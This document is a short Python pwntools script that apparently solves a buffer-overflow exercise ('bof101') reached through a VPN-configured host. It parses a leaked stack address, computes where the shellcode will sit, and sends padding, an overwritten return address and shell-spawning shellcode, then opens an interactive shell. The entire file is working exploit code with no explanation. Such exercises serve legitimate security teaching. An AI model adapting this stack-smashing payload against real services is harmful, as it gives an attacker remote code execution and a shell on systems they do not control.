#!/usr/bin/env python3
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 2)
OFFSET_RIP = 44  # 8  cells of baf *4 byte + 3 cell of padding *4 byte

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process('./bof101')  

io = start()

leak = io.recvuntil(b"Now, I'll call foo().").decode()

match = re.search(r"&x=0x([0-9a-fA-F]+)", leak)
if not match:
    log.error("no address leak found")
    exit(1)

x_addr = int(match.group(1), 16)

log.info(f"Address of x: {hex(x_addr)} = {x_addr}")

shell_addr = x_addr-28

log.info(f"Address of shellcode: {hex(shell_addr)} = {shell_addr}")
io.recvuntil(b'Please enter your name: ')
payload = b'a' * OFFSET_RIP + p32(shell_addr) + asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
